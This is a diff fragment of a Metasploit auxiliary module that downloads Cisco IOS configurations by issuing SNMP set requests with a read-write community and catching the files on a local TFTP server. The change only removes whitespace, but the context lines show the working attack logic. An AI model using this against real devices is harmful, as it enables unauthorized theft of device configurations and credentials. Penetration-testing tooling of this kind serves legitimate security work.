@@ -24,8 +24,8 @@ class Metasploit3 < Msf::Auxiliary
 			'Version'        => '$Revision$',
 			'Description' => %q{
 					This module will download the startup or running configuration
-				from a Cisco IOS device using SNMP and TFTP. A read-write SNMP 
-				community is required. The SNMP community scanner module can 
+				from a Cisco IOS device using SNMP and TFTP. A read-write SNMP
+				community is required. The SNMP community scanner module can
 				assist in identifying a read-write community. The target must
 				be able to connect back to the Metasploit system and the use of
 				NAT will cause the TFTP transfer to fail.
@@ -54,12 +54,12 @@ class Metasploit3 < Msf::Auxiliary
 		@tftp.incoming_file_hook = Proc.new{|info| process_incoming(info) }
 		@tftp.start
 		add_socket(@tftp.sock)
-		
+
 		@main_thread = ::Thread.current
-		
+
 		print_status("Scanning for vulnerable targets...")
 	end
-	
+
 	#
 	# Kill the TFTP server
 	#
@@ -69,7 +69,7 @@ class Metasploit3 < Msf::Auxiliary
 			# Wait 5 seconds for background transfers to complete
 			print_status("Providing some time for transfers to complete...")
 			::IO.select(nil, nil, nil, 5.0)
-		
+
 			print_status("Shutting down the TFTP service...")
 			if @tftp
 				@tftp.close rescue nil
@@ -77,7 +77,7 @@ class Metasploit3 < Msf::Auxiliary
 			end
 		end
 	end
-	
+
 	#
 	# Callback for incoming files
 	#
@@ -87,14 +87,14 @@ class Metasploit3 < Msf::Auxiliary
 		data = info[:file][:data]
 		from = info[:from]
 		return if not (name and data)
-		
+
 		# Trim off IPv6 mapped IPv4 if necessary
 		from = from[0].dup
 		from.gsub!('::ffff:', '')
-	
+
 		print_status("Incoming file from #{from} - #{name} #{data.length} bytes")
-		
-		# Save the configuration file if a path is specified 
+
+		# Save the configuration file if a path is specified
 		if datastore['OUTPUTDIR']
 			name = "#{from}.txt"
 			::FileUtils.mkdir_p(datastore['OUTPUTDIR'])
@@ -104,13 +104,13 @@ class Metasploit3 < Msf::Auxiliary
 			end
 			print_status("Saved configuration file to #{path}")
 		end
-		
+
 		# Toss the configuration file to the parser
 		cisco_ios_config_eater(from, 161, data)
 	end
-	
+
 	def run_host(ip)
-	
+
 		begin
 			source   = datastore['SOURCE'].to_i
 			protocol = 1
@@ -127,11 +127,11 @@ class Metasploit3 < Msf::Auxiliary
 			session = rand(255) + 1
 
 			snmp = connect_snmp
-			
+
 
 			varbind = SNMP::VarBind.new("#{ccconfigcopyprotocol}#{session}" , SNMP::Integer.new(protocol))
 			value = snmp.set(varbind)
-			
+
 			# If the above line didn't throw an error, the host is alive and the community is valid
 			print_status("Trying to acquire configuration from #{ip}...")
 
@@ -154,7 +154,7 @@ class Metasploit3 < Msf::Auxiliary
 			value = snmp.set(varbind)
 
 			disconnect_snmp
-			
+
 		# No need to make noise about timeouts
 		rescue ::SNMP::RequestTimeout, ::Rex::ConnectionRefused
 		rescue ::Interrupt
